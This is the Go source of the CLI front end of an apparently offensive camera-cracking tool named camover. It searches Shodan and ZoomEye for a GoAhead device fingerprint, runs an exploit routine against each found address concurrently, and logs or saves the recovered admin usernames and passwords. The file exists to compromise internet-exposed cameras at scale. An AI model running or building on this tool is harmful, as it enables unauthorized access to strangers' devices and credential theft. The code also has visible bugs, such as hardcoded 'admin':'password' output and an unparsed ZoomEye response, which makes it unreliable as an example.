package camover

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"net/http"
	"os"
	"sync"
	"time"

	"github.com/ns3777k/go-shodan/v4/shodan"
	"github.com/seaung/camover-go/pkg/logger"
)

type CamOverCli struct {
	Logger  logger.Logger
	CamOver CamOver
	Delay   time.Duration
}

type CamOverResult struct {
	Username string
	Password string
}

var (
	thread     bool
	output     string
	input      string
	address    string
	shodanKey  string
	zoomeyeKey string
	pages      int
)

func NewCamOverCli() *CamOverCli {
	return &CamOverCli{
        Delay: time.Second / 10,
    }
}

func (cli *CamOverCli) initOptions() {
	flag.BoolVar(&thread, "t", false, "Use threads for fastes work.")
	flag.StringVar(&output, "o", "", "Ouput result to file.")
	flag.StringVar(&input, "i", "", "Input file of file.")
	flag.StringVar(&address, "a", "", "Single address.")
	flag.StringVar(&shodanKey, "shodan", "", "Shodan API key for exploiting devices over Inernet.")
	flag.StringVar(&zoomeyeKey, "zoomeye", "", "Zoome API key for exploiting devices over Internet.")
	flag.IntVar(&pages, "p", 100, "Number of pages you want to get from ZoomEye")
	flag.Parse()
}

func (cli *CamOverCli) crackAddresses(addresses []string) {
	var wg sync.WaitGroup

	for _, addr := range addresses {
		wg.Add(1)

		go func(addr string) {
			defer wg.Done()
            if cli.thread(addr) {
                results := fmt.Sprintf("(%s) - %s:%s", address, "admin", "password")
                if output != "" {
                    cli.writeFile(output, results)
                } else {
                    cli.Logger.Process(results)
                }
            }
		}(addr)
	}

	wg.Wait()
}

func (cli *CamOverCli) readAddressesFromFile() ([]string, error) {
	fs, err := os.Open(input)
	if err != nil {
		return nil, err
	}
	defer fs.Close()

	var addresses []string

	scanner := bufio.NewScanner(fs)

	for scanner.Scan() {
		addresses = append(addresses, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return addresses, nil
}

func (cli *CamOverCli) thread(address string) bool {
    username, password, err := cli.CamOver.Exploit(address)
    if err != nil {
        cli.Logger.Errorw(fmt.Sprintf("(%s) - %s:%s", address, username, password))
        return false
    }
    if username != "" && password != "" {
        results := fmt.Sprintf("(%s) - %s:%s", address, username, password)
        if output != "" {
            _ = cli.writeFile(output, results)
            return true
        }

        cli.Logger.Process(results)

        return false
    }
    return false
}

func (cli *CamOverCli) writeFile(path, results string) error {
    fs, err := os.OpenFile(path, os.O_APPEND | os.O_WRONLY, 0664)
    if err != nil {
        return err
    }
    defer fs.Close()
    if _, err := fs.WriteString(results + "\n"); err != nil {
        return err
    }

    return nil
}

func (cli *CamOverCli) crackTargetFromFile(path string) {
    fs, err := os.Open(path)
    if err != nil {
        cli.Logger.Warning("Failed to open input file : " + err.Error())
        fs.Close()
        return
    }

    defer fs.Close()

    addresses := make([]string, 0)
    scanner := bufio.NewScanner(fs)
    for scanner.Scan() {
        addresses = append(addresses, scanner.Text())
    }

    cli.crackAddresses(addresses)
}

func (cli *CamOverCli) handleShodan() {
    var addresses []string
    httpClient := &http.Client{}
    client := shodan.NewClient(httpClient, shodanKey)

    result, err := client.GetHostsForQuery(context.Background(), &shodan.HostQueryOptions{Query: "GoAhead 5ccc069c403ebaf9f0171e9517f40e41"})

    if err != nil {
        cli.Logger.Errorw(err.Error())
        return
    }

    for _, item := range result.Matches {
        addresses = append(addresses, fmt.Sprintf("%s:%s", item.IP.String(), item.Port))
    }

    cli.crackAddresses(addresses)
}

func (cli *CamOverCli) handleZoomeye() {
    url := fmt.Sprintf("https://api.zoomeye.org/host/search?query=GoAhead 5ccc069c403ebaf9f0171e9517f40e41&page=%d", pages)
    client := &http.Client{}

    request, err := http.NewRequest(http.MethodGet, url, nil)
    if err != nil {
        cli.Logger.Warning(err.Error())
        return
    }

    request.Header.Set("Authorization", zoomeyeKey)

    response, err := client.Do(request)
    if err != nil {
        cli.Logger.Errorw(err.Error())
        return
    }

    defer response.Body.Close()
}

func (cli *CamOverCli) start() {
    if output != "" {
        if _, err := os.Stat(output);os.IsNotExist(err) {
            cli.Logger.Errorw("Input file does not exist : " + err.Error())
        }
    }

    if zoomeyeKey != "" {
        cli.handleZoomeye()
    } else if shodanKey != "" {
        cli.handleShodan()
    } else if input != "" {
        cli.crackTargetFromFile(input)
    } else if address != "" {
        cli.thread(address)
    } else {
        flag.PrintDefaults()
    }
}

func Run() {
    cli := NewCamOverCli()
    cli.initOptions()
    cli.start()
}

